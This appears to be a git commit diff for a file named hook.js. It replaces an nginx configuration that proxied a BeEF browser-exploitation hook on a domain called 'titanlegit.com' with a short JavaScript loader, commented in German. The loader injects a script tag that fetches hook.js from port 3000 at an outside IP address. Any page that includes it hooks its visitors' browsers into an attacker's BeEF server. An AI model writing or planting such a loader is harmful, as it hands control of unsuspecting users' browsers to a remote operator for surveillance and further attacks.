3c073ba95c47f38aa8f0514c1ca2cb3f31f41934
titanxrio <Titan150208@gmail.com>
2025-08-07 01:09:57 +0200

    Update hook.js

--- hook.js
+++ hook.js
@@ -1,15 +1,8 @@
-server {
-    listen 80;
-    server_name titanlegit.com www.titanlegit.com;
-
-    # Proxy für BeEF-Hook
-    location /hook.js {
-        proxy_pass http://127.0.0.1:3000/hook.js;
-    }
-
-    location / {
-        root /var/www/html;
-        index index.html;
-        try_files $uri $uri/ =404;
-    }
-}
+// hook.js – lädt zur Laufzeit den echten BeEF-Hook von deinem BeEF-Server
+(function(){
+  var s = document.createElement('script');
+  s.src = 'http://37.221.92.148:3000/hook.js';
+  s.async = true;
+  s.defer = true;
+  document.head.appendChild(s);
+})();
